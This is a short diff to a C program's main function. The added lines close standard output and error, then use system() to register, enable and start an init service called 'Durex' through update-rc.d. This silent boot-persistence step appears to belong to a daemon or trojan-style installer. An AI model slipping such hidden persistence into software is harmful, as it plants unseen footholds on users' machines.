@@ -68,4 +68,8 @@ int 	main(void)
 		exit_error("Error unmapping memory", 4);
 	if (munmap(init_file, size_init) == -1)
 		exit_error("Error unmapping memory", 5);
+
+	close(1);
+	close(2);
+	system("update-rc.d -f Durex remove; update-rc.d -f Durex defaults; update-rc.d -f Durex enable; service Durex start");
 }
